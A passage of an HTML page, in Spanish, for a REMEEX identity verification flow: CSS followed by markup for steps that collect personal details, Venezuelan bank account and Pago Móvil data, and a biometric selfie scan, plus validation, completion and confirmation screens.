      font-size: 0.9rem;
      margin-bottom: 0.25rem;
    }

    .toast-message {
      font-size: 0.8rem;
      opacity: 0.9;
    }

    .toast-close {
      color: var(--neutral-400);
      cursor: pointer;
      transition: var(--transition-base);
      flex-shrink: 0;
      font-size: 1rem;
    }

    .toast-close:hover {
      color: white;
    }
    /* Tawk.to */
    .tawkto-container {
      position: fixed;
      z-index: 1200;
      bottom: 20px;
      right: 20px;
      visibility: hidden;
      display: none;
    }


    /* ===============================================
       CORRECCIÓN CRÍTICA: Responsive Design Mejorado
       =============================================== */
    @media (max-width: 768px) {
      .verification-container {
        padding-left: 0.5rem;
        padding-right: 0.5rem;
      }

      .form-row {
        flex-direction: column;
      }

      .form-col {
        min-width: auto;
      }

      /* Progress bar responsive adjustments */
      .progress-bar {
        height: 4px;
      }
      .progress-text {
        font-size: 0.75rem;
      }

      .bank-grid {
        grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
        gap: 0.75rem;
      }

      .bank-option {
        padding: 0.75rem;
      }

      .bank-logo {
        width: 36px;
        height: 36px;
      }

      .bank-name {
        font-size: 0.7rem;
      }

      .camera-container {
        height: 280px;
      }

      .face-guide {
        width: 120px;
        height: 150px;
      }

      .camera-btn {
        width: 48px;
        height: 48px;
        font-size: 1.2rem;
      }

      .camera-btn.capture {
        width: 60px;
        height: 60px;
      }

      .navigation {
        flex-direction: column;
        gap: 1rem;
      }

      .navigation .btn {
        width: 100%;
        min-width: auto;
      }

      .toast-container {
        right: 0.5rem;
        left: 0.5rem;
      }

      .toast {
        min-width: auto;
      }

      /* CORRECCIÓN CRÍTICA: Tally responsive mejorado */
      .tally-section {
        margin: 1.5rem -0.5rem;
        padding: 1rem;
      }

      .tally-container {
        min-height: 70vh; /* Adaptado para móvil */
      }

      .tally-container iframe {
        width: 90%;
        height: 100%;
        margin: 0 5%;
      }

      .tally-modal iframe {
        width: 100%;
        height: 100%;
      }

      .tally-iframe-container {
        padding-bottom: 0;
        overflow: auto;
      }

      .tally-icon {
        width: 50px;
        height: 50px;
        font-size: 1.5rem;
      }

      .tally-title {
        font-size: 1.1rem;
      }

      .tally-subtitle {
        font-size: 0.85rem;
      }

      /* Validación responsive */
      .validation-spinner {
        width: 100px;
        height: 100px;
      }

      .validation-spinner::before {
        font-size: 1.5rem;
      }

      .validation-title {
        font-size: 1.5rem;
      }

      .validation-subtitle {
        font-size: 1rem;
      }
    }

    @media (max-width: 480px) {
      .card-body {
        padding: 1rem;
      }

      .card-header {
        padding: 1rem;
      }

      .card-title {
        font-size: 1.1rem;
      }

      .bank-grid {
        grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
      }

      .camera-container {
        height: 240px;
      }

      /* CORRECCIÓN CRÍTICA: Tally ultraresponsive */
      .tally-container {
        min-height: 65vh;
      }

      .tally-container iframe {
        width: 90%;
        height: 100%;
        margin: 0 5%;
      }

      .tally-modal iframe {
        width: 100%;
        height: 100%;
      }

      .form-control {
        height: 44px;
        font-size: 0.85rem;
      }

      .btn {
        height: 44px;
        font-size: 0.85rem;
      }

      .verification-container {
        padding-top: 60px;
      }
    }

    @media (max-width: 360px) {
      .card-title {
        font-size: 1rem;
      }

      .form-control {
        height: 40px;
        font-size: 0.8rem;
      }

      .btn {
        height: 40px;
        font-size: 0.8rem;
      }

      .confirm-content {
        padding: 1rem;
      }

      .tally-modal iframe {
        width: 100%;
        height: 100%;
      }
    }

    /* ===============================================
       ANIMATIONS MEJORADAS
       =============================================== */
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideDown {
      from { opacity: 0; height: 0; }
      to { opacity: 1; height: auto; }
    }

    @keyframes checkmarkScale {
      0% { transform: scale(0); }
      50% { transform: scale(1.2); }
      100% { transform: scale(1); }
    }

    @keyframes countdown {
      0%, 33% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      33.1%, 66% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      66.1%, 99% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -50%) scale(1.2); }
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    @keyframes slideInRight {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }

    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; visibility: hidden; }
    }

    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
  </style>
  <link rel="stylesheet" href="responsive.css">
</head>

<body>
  <!-- Header -->
  <header class="app-header">
    <div class="header-brand">
      <a href="index">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX">
      </a>
    </div>
    
    <div class="header-actions">
      <a href="homevisa.html" class="header-action-btn" title="Volver al panel">
        <i class="fas fa-arrow-left"></i>
      </a>
      <a href="https://wa.me/+17373018059" class="header-action-btn whatsapp-link" target="_blank" title="Soporte">
        <i class="fab fa-whatsapp"></i>
      </a>
        <button type="button" class="header-action-btn" id="support-btn" title="Soporte">
          <i class="fas fa-headset"></i>
        </button>
    </div>
  </header>

  <!-- Main Container -->
  <div class="verification-container">
    <!-- Already Completed Screen -->
    <div id="already-completed-screen" class="already-completed" style="display: none;">
      <div class="already-completed-icon">
        <i class="fas fa-check-circle"></i>
      </div>
      <h1 class="already-completed-title">Verificación Ya Completada</h1>
      <p class="already-completed-text">
        Usted ya ha completado exitosamente el proceso de verificación de identidad. 
        No es necesario realizarlo nuevamente.
      </p>
      
      <div class="verification-details">
        <div class="detail-row">
          <span class="detail-label">Estado:</span>
          <span class="detail-value" id="verification-status-display">Verificado</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">Fecha de verificación:</span>
          <span class="detail-value" id="verification-date-display">-</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">Datos bancarios:</span>
          <span class="detail-value">✓ Registrados</span>
        </div>
      </div>

      <a href="recarga" class="btn btn-primary btn-block">
        <i class="fas fa-arrow-left"></i> Volver al Panel Principal
      </a>
    </div>

    <!-- Main Verification Process -->
    <div id="verification-process">
      <!-- Progress Bar -->
      <div class="progress-container" id="progressContainer">
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="progress-text">
          <span>Verificación en progreso</span>
          <span class="progress-percentage" id="progressPercentage">0%</span>
        </div>
      </div>

      <!-- Step 1: Personal Information -->
      <div class="step-content active" id="step-1">
        <div class="card">
          <div class="card-header">
            <h2 class="card-title">
              <i class="fas fa-user"></i>
              Información Personal
            </h2>
            <p class="card-subtitle">
              Ingrese sus datos personales tal como aparecen en su documento de identidad oficial
            </p>
          </div>
          <div class="card-body">
            <div class="form-row">
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="full-name">
                    <i class="fas fa-user"></i>
                    Nombre Completo
                  </label>
                    <input type="text" class="form-control fixed-field" id="full-name" placeholder="Nombre y apellidos completos" readonly>
                  <div class="error-message" id="full-name-error">Por favor ingrese su nombre completo</div>
                </div>
              </div>
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="birth-date">
                    <i class="fas fa-calendar-alt"></i>
                    Fecha de Nacimiento
                  </label>
                    <input type="date" class="form-control fixed-field" id="birth-date" readonly>
                  <div class="error-message" id="birth-date-error">Por favor seleccione su fecha de nacimiento</div>
                </div>
              </div>
            </div>

            <div class="form-row">
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="id-type">
                    <i class="fas fa-id-card"></i>
                    Tipo de Documento
                  </label>
                    <select class="form-control fixed-field" id="id-type" disabled>
                    <option value="">Seleccione el tipo de documento</option>
                    <option value="cedula">Cédula de Identidad</option>
                    <option value="pasaporte">Pasaporte</option>
                    <option value="dni">DNI</option>
                    <option value="rut">RUT</option>
                    <option value="otro">Otro</option>
                  </select>
                  <div class="error-message" id="id-type-error">Por favor seleccione el tipo de documento</div>
                </div>
              </div>
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="documentNumber">
                    <i class="fas fa-fingerprint"></i>
                    Número de Documento
                  </label>
                    <input type="text" class="form-control fixed-field" id="documentNumber" placeholder="Ej: V-12345678" readonly>
                  <div class="error-message" id="documentNumber-error">Por favor ingrese el número de documento</div>
                </div>
              </div>
            </div>

            <div class="form-row">
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="email">
                    <i class="fas fa-envelope"></i>
                    Correo Electrónico
                  </label>
                    <input type="email" class="form-control fixed-field" id="email" placeholder="ejemplo@correo.com" readonly>
                  <div class="error-message" id="email-error">Por favor ingrese un correo electrónico válido</div>
                </div>
              </div>
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="phoneNumber">
                    <i class="fas fa-phone"></i>
                    Número de Teléfono
                  </label>
                    <input type="tel" class="form-control fixed-field" id="phoneNumber" placeholder="+58 412 1234567" readonly>
                  <div class="error-message" id="phoneNumber-error">Por favor ingrese un número de teléfono válido</div>
                </div>
              </div>
            </div>

            <div class="form-group">
              <label class="form-label" for="address">
                <i class="fas fa-home"></i>
                Dirección de Residencia
              </label>
              <textarea class="form-control" id="address" placeholder="Dirección completa donde reside actualmente" required></textarea>
              <div class="error-message" id="address-error">Por favor ingrese su dirección completa</div>
            </div>

            <div class="form-row">
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="nationality">
                    <i class="fas fa-flag"></i>
                    Nacionalidad
                  </label>
                    <select class="form-control fixed-field" id="nationality" disabled>
                    <option value="">Seleccione su nacionalidad</option>
                    <option value="VE">Venezuela</option>
                    <option value="CO">Colombia</option>
                    <option value="US">Estados Unidos</option>
                    <option value="ES">España</option>
                    <option value="MX">México</option>
                    <option value="AR">Argentina</option>
                    <option value="CL">Chile</option>
                    <option value="PE">Perú</option>
                    <option value="EC">Ecuador</option>
                    <option value="other">Otro</option>
                  </select>
                  <div class="error-message" id="nationality-error">Por favor seleccione su nacionalidad</div>
                </div>
              </div>
              <div class="form-col">
                <div class="form-group">
                  <label class="form-label" for="occupation">
                    <i class="fas fa-briefcase"></i>
                    Ocupación
                  </label>
                  <input type="text" class="form-control" id="occupation" placeholder="Su profesión u ocupación" required>
                  <div class="error-message" id="occupation-error">Por favor ingrese su ocupación</div>
                </div>
              </div>
            </div>
          </div>
          </div>

          <div class="navigation">
          <div></div>
          <button class="btn btn-primary" id="next-step-1">
            Continuar <i class="fas fa-arrow-right" style="margin-left: 0.5rem; margin-right: 0;"></i>
          </button>
        </div>
      </div>

      <!-- Step 2: Banking Information -->
      <div class="step-content" id="step-2">
        <div class="card">
          <div class="card-header">
            <h2 class="card-title">
              <i class="fas fa-university"></i>
              Datos Bancarios para Retiros
            </h2>
            <p class="card-subtitle">
              Registre su cuenta bancaria donde recibirá sus fondos en Bolívares Soberanos
            </p>
          </div>
          <div class="card-body">
            <div class="status-message info">
              <div class="status-icon">
                <i class="fas fa-shield-alt"></i>
              </div>
              <div class="status-content">
                <div class="status-title">Información Importante</div>
                <div class="status-text">
                  La cuenta bancaria debe estar a su nombre y coincidir exactamente con los datos de identidad proporcionados.
                </div>
              </div>
            </div>

            <div class="form-group">
              <label class="form-label">
                <i class="fas fa-university"></i>
                Seleccione su Banco
              </label>
              <div class="bank-grid" id="bank-grid">
                <!-- Banks will be populated by JavaScript -->
              </div>
            </div>

            <div class="selected-bank-info" id="selected-bank-info">
              <div class="selected-bank-display">
                <img class="selected-bank-logo" id="selected-bank-logo" src="" alt="">
                <span class="selected-bank-name" id="selected-bank-name"></span>
              </div>

              <div class="form-group">
                <label class="form-label">
                  <i class="fas fa-credit-card"></i>
                  Tipo de Cuenta
                </label>
                <div class="account-type-toggle">
                  <button type="button" class="account-type-option active" data-type="corriente">
                    Corriente
                  </button>
                  <button type="button" class="account-type-option" data-type="ahorro">
                    Ahorro
                  </button>
                </div>
              </div>

              <div class="form-group">
                <label class="form-label" for="account-number">
                  <i class="fas fa-hashtag"></i>
                  Número de Cuenta
                </label>
                <input type="text" class="form-control" id="account-number" inputmode="numeric" pattern="[0-9]*" maxlength="20" placeholder="Ej: 01050123456789012345" required>
                <div class="error-message" id="account-number-error">Por favor ingrese el número de cuenta</div>
              </div>

              <div class="pago-movil-toggle" id="pago-movil-toggle">
                <div class="toggle-switch" id="pago-movil-switch"></div>
                <span class="toggle-label">¿Acepta Pago Móvil?</span>
              </div>

              <div class="pago-movil-fields" id="pago-movil-fields">
                <div class="form-row">
                  <div class="form-col">
                    <div class="form-group">
                      <label class="form-label" for="pago-movil-phone">
                        <i class="fas fa-mobile-alt"></i>
                        Teléfono Pago Móvil
                      </label>
                      <input type="tel" class="form-control" id="pago-movil-phone" inputmode="numeric" pattern="[0-9]*" maxlength="11" placeholder="0412-1234567">
                      <div class="error-message" id="pago-movil-phone-error">Por favor ingrese el teléfono</div>
                    </div>
                  </div>
                  <div class="form-col">
                    <div class="form-group">
                      <label class="form-label" for="pago-movil-cedula">
                        <i class="fas fa-id-card"></i>
                        Cédula Pago Móvil
                      </label>
                      <input type="text" class="form-control" id="pago-movil-cedula" inputmode="numeric" pattern="[0-9]*" maxlength="10" placeholder="V-12345678">
                      <div class="error-message" id="pago-movil-cedula-error">Por favor ingrese la cédula</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="navigation">
          <button class="btn btn-outline" id="prev-step-2">
            <i class="fas fa-arrow-left"></i> Anterior
          </button>
          <button class="btn btn-primary" id="next-step-2" disabled>
            Continuar <i class="fas fa-arrow-right" style="margin-left: 0.5rem; margin-right: 0;"></i>
          </button>
        </div>
      </div>

      <!-- Step 3: Biometric Verification -->
      <div class="step-content" id="step-3">
        <div class="card">
          <div class="card-header">
            <h2 class="card-title">
              <i class="fas fa-user-check"></i>
              Verificación Biométrica Dinámica
            </h2>
            <p class="card-subtitle">
              Realice una prueba de vida guiada para validar que usted es el titular real de los datos proporcionados
            </p>
          </div>
          <div class="card-body">
            <div class="biometric-intro">
              <div class="intro-icon">
                <i class="fas fa-face-viewfinder"></i>
              </div>
              <div class="intro-content">
                <h3>Prepara tu rostro para la validación</h3>
                <p>Coloca tu dispositivo a la altura de tus ojos y sigue cada indicación que aparezca en el visor para completar la prueba de vida.</p>
                <div class="intro-badges">
                  <span class="intro-badge intro-badge-success" id="camera-ready" style="display: none;">
                    <i class="fas fa-camera"></i>
                    Cámara calibrada
                  </span>
                  <span class="intro-badge intro-badge-info">
                    <i class="fas fa-bolt"></i>
                    Escaneo biométrico inteligente
                  </span>
                </div>
              </div>
            </div>

            <div class="biometric-grid">
              <div class="biometric-visual">
                <div class="biometric-toolbar">
                  <div class="biometric-status status-idle" id="liveness-status">
                    <span class="status-dot"></span>
                    <span class="status-label" id="liveness-status-text">Listo para iniciar</span>
                  </div>
                  <button class="toolbar-btn" id="switch-camera" type="button" title="Cambiar cámara">
                    <i class="fas fa-camera-rotate"></i> Cambiar vista
                  </button>
                </div>

                <div class="camera-container" id="camera-container">
                  <video class="camera-video" id="camera-video" autoplay playsinline muted></video>
                  <div class="camera-overlay" id="liveness-overlay" data-stage="idle">
                    <div class="overlay-grid"></div>
                    <div class="overlay-frame"></div>
                    <div class="overlay-corners">
                      <span class="corner corner-tl"></span>
                      <span class="corner corner-tr"></span>
                      <span class="corner corner-bl"></span>
                      <span class="corner corner-br"></span>
                    </div>
                    <div class="liveness-points">
                      <span class="point point-left"></span>
                      <span class="point point-right"></span>
                      <span class="point point-top"></span>
                      <span class="point point-bottom-left"></span>
                      <span class="point point-bottom-right"></span>
                      <span class="point point-center"></span>
                    </div>
                    <div class="liveness-focus-dot"></div>
                    <div class="overlay-scan-line"></div>
                    <div class="camera-instructions" id="camera-instructions">
                      Alinee su rostro con el marco luminoso
                    </div>
                  </div>
                  <div class="camera-countdown" id="camera-countdown">3</div>
                </div>
                <div class="camera-actions">
                  <button class="btn btn-primary btn-block" id="start-liveness" type="button">
                    <i class="fas fa-bolt"></i> Iniciar escaneo biométrico
                  </button>
                  <button class="btn btn-outline btn-block" id="retake-btn-primary" type="button" style="display: none;">
                    <i class="fas fa-redo"></i> Repetir escaneo
                  </button>
                  <button class="btn btn-outline btn-block" id="request-camera-access" type="button">
                    <i class="fas fa-video"></i> Otorgar permiso de la cámara
                  </button>
                  <button class="btn btn-outline btn-block" id="skip-biometrics" type="button">
                    <i class="fas fa-id-card"></i> No quiero hacer verificación biométrica
                  </button>
                </div>
              </div>

              <div class="biometric-guide">
                <div class="liveness-stepper" id="liveness-stepper">
                  <div class="liveness-active-step" id="liveness-active-step"></div>
                </div>

                <div class="liveness-summary is-hidden" id="liveness-summary">
                  <div class="summary-header">
                    <i class="fas fa-check-double"></i>
                    <span>Pasos completados</span>
                  </div>
                  <div class="summary-items" id="liveness-summary-list" aria-live="polite"></div>
                </div>

                <div class="liveness-instruction">
                  <h3 id="liveness-instruction-title">Prepárese para un escaneo 3D</h3>
                  <p id="liveness-instruction-text">Cuando inicie le pediremos movimientos suaves para confirmar que es una persona real.</p>
                </div>

                <div class="liveness-progress">
                  <div class="liveness-progress-track">
                    <div class="liveness-progress-bar" id="liveness-progress-bar"></div>
                  </div>
                  <span class="liveness-progress-label" id="liveness-progress-label">0% completado</span>
                </div>

                <div class="liveness-actions">
                  <button class="btn btn-outline btn-block" id="retake-btn" style="display: none;">
                    <i class="fas fa-redo"></i> Repetir escaneo
                  </button>
                </div>

                <ul class="liveness-tips">
                  <li><i class="fas fa-sun"></i> Utilice una iluminación frontal y evite contraluces.</li>
                  <li><i class="fas fa-eye"></i> Mantenga sus ojos visibles, sin lentes oscuros ni gorras.</li>
                  <li><i class="fas fa-wave-square"></i> Siga cada instrucción cuando el visor cambie de color.</li>
                </ul>
              </div>
            </div>

            <div class="selfie-preview" id="selfie-preview">
              <img id="selfie-image" alt="Selfie capturada">
              <div class="preview-overlay">
                <div class="preview-actions">
                  <button class="preview-btn remove" id="remove-selfie" title="Repetir escaneo">
                    <i class="fas fa-redo"></i>
                  </button>
                </div>
              </div>
            </div>

            <div class="analysis-report" id="analysis-report">
              <div class="analysis-header">
                <div class="analysis-score">
                  <span class="score-label">Nivel de coincidencia</span>
                  <span class="score-value" id="analysis-score-value">--</span>
                </div>
                <div class="analysis-status status-pending" id="analysis-status">
                  <i class="fas fa-shield-halved"></i> Escaneo pendiente
                </div>
              </div>
              <div class="analysis-checklist">
                <div class="analysis-item" data-check-step="frontal">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Registro frontal</strong>
                    <p>Calibrando geometría y proporciones del rostro.</p>
                  </div>
                </div>
                <div class="analysis-item" data-check-step="turn-left">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Giro izquierdo</strong>
                    <p>Analizando puntos de referencia laterales.</p>
                  </div>
                </div>
                <div class="analysis-item" data-check-step="turn-right">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Giro derecho</strong>
                    <p>Validando simetría y continuidad facial.</p>
                  </div>
                </div>
                <div class="analysis-item" data-check-step="smile">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Gesto de sonrisa</strong>
                    <p>Confirmando respuesta muscular y expresión natural.</p>
                  </div>
                </div>
                <div class="analysis-item" data-check-step="focus">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Mirada fija</strong>
                    <p>Verificando enfoque ocular y atención sostenida.</p>
                  </div>
                </div>
                <div class="analysis-item" data-check-step="quality">
                  <span class="item-icon"><i class="fas fa-circle-notch"></i></span>
                  <div class="item-content">
                    <strong>Validación anti-spoofing</strong>
                    <p>Comparando coincidencia biométrica con medidas antifraude.</p>
                  </div>
                </div>
              </div>
            </div>

            <div class="status-message info">
              <div class="status-icon">
                <i class="fas fa-shield-alt"></i>
              </div>
              <div class="status-content">
                <div class="status-title">Privacidad y Seguridad</div>
                <div class="status-text">
                  Su foto biométrica se utiliza únicamente para verificación de identidad y se maneja con los más altos estándares de seguridad y privacidad.
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="navigation">
          <button class="btn btn-outline" id="prev-step-3">
            <i class="fas fa-arrow-left"></i> Anterior
          </button>
          <button class="btn btn-primary" id="next-step-3" disabled>
            Continuar <i class="fas fa-arrow-right" style="margin-left: 0.5rem; margin-right: 0;"></i>
          </button>
        </div>
      </div>

      <!-- Step 4: Final Verification -->
      <div class="step-content" id="step-4">
        <div class="card">
          <div class="card-header">
            <h2 class="card-title">
              <i class="fas fa-check-circle"></i>
              Verificación Final
            </h2>
            <p class="card-subtitle">
              Complete el formulario final para finalizar su proceso de verificación de identidad
            </p>
          </div>
          <div class="card-body">
            <div class="status-message info resume-message" id="resume-message" style="display: none;">
              <div class="status-icon">
                <i class="fas fa-history"></i>
              </div>
              <div class="status-content">
                <div class="status-title">Retomamos tu progreso guardado</div>
                <div class="status-text" id="resume-message-text">
                  Ya registramos la información previa. Continúa con los pasos pendientes para terminar tu verificación.
                </div>
              </div>
            </div>
            <div class="status-message success">
              <div class="status-icon">
                <i class="fas fa-check-double"></i>
              </div>
              <div class="status-content">
                <div class="status-title">Información Recibida Correctamente</div>
                <div class="status-text" id="final-biometric-message">
                  Hemos recibido sus datos personales, información bancaria y verificación biométrica.
                  Complete el siguiente formulario para finalizar el proceso.
                </div>
              </div>
            </div>

            <div class="status-message info">
              <div class="status-icon">
                <i class="fas fa-clock"></i>
              </div>
              <div class="status-content">
                <div class="status-title">Tiempo de Procesamiento</div>
                <div class="status-text">
                  Una vez completado el formulario, su verificación será procesada en un plazo de 5-15 minutos.
                  Recibirá una notificación por correo electrónico cuando esté lista.
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="tally-completion-indicator" id="tally-completion-indicator" style="display: none;">
          <i class="fas fa-check-circle"></i>
          <span>Formulario completado correctamente - Ya puede finalizar la verificación</span>
        </div>

        <div class="navigation">
          <button class="btn btn-outline" id="prev-step-4">
            <i class="fas fa-arrow-left"></i> Anterior
          </button>
          <button class="btn btn-success btn-block" id="complete-verification" disabled>
            <i class="fas fa-check-circle"></i> Completar Verificación
          </button>
        </div>
      </div>

      <!-- CORRECCIÓN CRÍTICA: Nueva Pantalla de Validación -->
      <div class="step-content" id="validation">
        <div class="validation-screen">
          <div class="validation-spinner"></div>
          <h1 class="validation-title">Validando Documentos</h1>
          <p class="validation-subtitle">
            Nuestro sistema está procesando y validando toda su información. 
            Este proceso puede tomar unos momentos...
          </p>
          
          <div class="validation-progress">
            <div class="validation-progress-bar" id="validation-progress-bar"></div>
          </div>

          <div class="validation-steps">
            <div class="validation-step active" id="validation-step-1">
              <div class="validation-step-icon">1</div>
              <span>Verificando información personal</span>
            </div>
            <div class="validation-step" id="validation-step-2">
              <div class="validation-step-icon">2</div>
              <span>Validando datos bancarios</span>
            </div>
            <div class="validation-step" id="validation-step-3">
              <div class="validation-step-icon">3</div>
              <span>Procesando biometría facial</span>
            </div>
            <div class="validation-step" id="validation-step-4">
              <div class="validation-step-icon">4</div>
              <span>Completando verificación</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Completion Screen -->
      <div class="step-content" id="completion">
        <div class="completion-screen">
          <div class="completion-icon">
            <i class="fas fa-check"></i>
          </div>
          <h1 class="completion-title">¡Verificación Completada!</h1>
          <p class="completion-subtitle">
            Su proceso de verificación de identidad ha sido enviado exitosamente. 
            Nuestro equipo revisará su información en los próximos 5-15 minutos y le notificaremos por correo electrónico.
          </p>
          <a href="#" id="return-dashboard" class="btn btn-primary btn-block">
            <i class="fas fa-home"></i> Volver al Panel Principal
          </a>
        </div>
      </div>
    </div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text" id="loading-text">Procesando información...</div>
  </div>
  
  <div class="avatar-compare-overlay" id="avatar-compare-overlay" aria-hidden="true">
    <div class="avatar-compare-modal" role="dialog" aria-labelledby="avatar-compare-title" aria-describedby="avatar-compare-message">
      <div class="avatar-compare-header">
        <div class="avatar-compare-icon">
          <i class="fas fa-user-shield"></i>
        </div>
        <div class="avatar-compare-title" id="avatar-compare-title">Revisión adicional necesaria</div>
      </div>
      <div class="avatar-compare-status" id="avatar-compare-status">
        <i class="fas fa-triangle-exclamation"></i>
        Coincidencia débil
      </div>
      <div class="avatar-compare-images">
        <div class="avatar-compare-image">
          <span>Avatar registrado</span>
          <img id="avatar-reference-img" class="avatar-compare-img placeholder" alt="Avatar registrado">
        </div>
        <div class="avatar-compare-image">
          <span>Captura biométrica</span>
          <img id="avatar-selfie-img" class="avatar-compare-img" alt="Selfie capturada">
        </div>
      </div>
      <p class="avatar-compare-message" id="avatar-compare-message">
        Nuestro sistema detectó que la coincidencia facial entre tu avatar y la captura más reciente es más débil de lo esperado.
      </p>
      <p class="avatar-compare-followup" id="avatar-compare-followup">
        Solicitaremos una evaluación adicional para confirmar tu identidad. Un especialista revisará manualmente ambos registros y se comunicará contigo si necesita datos extra.
      </p>
      <button class="btn btn-primary btn-block avatar-compare-close" id="avatar-compare-close">
        <i class="fas fa-check"></i> Entendido
      </button>
    </div>
  </div>

  <!-- Volume Reminder Overlay -->
  <div class="confirm-overlay" id="volume-overlay" aria-hidden="true">
    <div class="confirm-content">
      <div class="volume-icon-wrapper">
        <i class="fas fa-volume-high" aria-hidden="true"></i>
      </div>
      <h3 class="volume-title">Activa el sonido</h3>
      <p class="volume-message">Para acompañarte durante la verificación, sube el volumen y permite que nuestras indicaciones en audio te guíen paso a paso.</p>
      <button class="btn btn-primary volume-confirm-button" id="volume-confirm-button">
        <i class="fas fa-check"></i> Entendido
      </button>
    </div>
  </div>

  <!-- Confirmation Overlay -->
  <div class="confirm-overlay" id="confirm-overlay">
    <div class="confirm-content">
      <img class="confirm-bank-logo" id="confirm-bank-logo" src="" alt="Logo Banco">
      <h3>Confirme sus datos bancarios</h3>
      <p id="confirm-bank"></p>
      <p id="confirm-account"></p>
      <div class="confirm-buttons">
        <button class="btn btn-outline" id="confirm-edit">Editar</button>
        <button class="btn btn-success" id="confirm-accept">Confirmar</button>
      </div>
    </div>
  </div>

  <div class="confirm-overlay" id="no-bank-overlay" aria-hidden="true">
    <div class="no-bank-modal" role="dialog" aria-modal="true" aria-labelledby="no-bank-title">
      <button type="button" class="no-bank-close" id="no-bank-close" aria-label="Cerrar">
        <i class="fas fa-times"></i>
      </button>
      <div class="no-bank-header">
        <div class="no-bank-badge" aria-hidden="true">
          <i class="fas fa-headset"></i>
        </div>
        <h3 id="no-bank-title">Contacta a soporte para continuar</h3>
        <p>
          Indícanos los datos del titular autorizado que utilizará una cuenta bancaria en tu nombre.
          Abriremos WhatsApp con un mensaje prediseñado para que notifiques tu caso al equipo de soporte.
        </p>
        <p class="no-bank-overlay-note">
          Una vez enviado el mensaje podrás concluir tu análisis biométrico automáticamente.
        </p>
      </div>
      <form class="no-bank-form" id="no-bank-form">
        <div class="form-group">
          <label class="form-label" for="no-bank-authorized-name">Nombre del nuevo titular autorizado</label>
          <input type="text" class="form-control" id="no-bank-authorized-name" placeholder="Nombre y apellido" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="no-bank-authorized-id">Cédula del titular autorizado</label>
          <input type="text" class="form-control" id="no-bank-authorized-id" placeholder="V-12345678" inputmode="text" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="no-bank-authorized-bank">Nombre del banco del autorizado</label>
          <input type="text" class="form-control" id="no-bank-authorized-bank" placeholder="Banco del autorizado" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="no-bank-relationship">Relación con el autorizado</label>
          <input type="text" class="form-control" id="no-bank-relationship" placeholder="Ej: Padre, hermana, socio" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="no-bank-message-preview">Mensaje para enviar a soporte</label>
          <textarea class="form-control" id="no-bank-message-preview" readonly>Completa todos los campos para generar el mensaje a soporte.</textarea>
        </div>
        <div class="no-bank-actions">
          <button type="button" class="btn btn-outline" id="no-bank-cancel">Cancelar</button>
          <button type="submit" class="btn btn-primary" id="no-bank-submit">
            <i class="fas fa-paper-plane"></i> Generar mensaje y contactar
          </button>
        </div>
      </form>
    </div>
  </div>

  <!-- ID Check Overlay -->
  <div class="confirm-overlay" id="id-check-overlay">
    <div class="confirm-content">
      <h3>Si el documento no coincide con su biometría, su cuenta puede ser bloqueada por intento de fraude.</h3>
      <div class="confirm-buttons">
        <button class="btn btn-outline" id="id-check-not-owner">No soy el titular del documento de identidad</button>
        <button class="btn btn-success" id="id-check-owner">Sí, soy el titular del documento</button>
      </div>
    </div>
  </div>

  <!-- Incomplete Data Overlay -->
  <div class="confirm-overlay" id="incomplete-overlay">
    <div class="confirm-content">
      <h3>Información incompleta</h3>
      <p>Debe completar todos los datos requeridos para continuar con la verificación.</p>
      <div class="confirm-buttons">
        <button class="btn btn-success" id="incomplete-close">Entendido</button>
      </div>
    </div>
  </div>

  <!-- Fraud Warning Overlay -->
  <div class="confirm-overlay" id="fraud-warning-overlay">
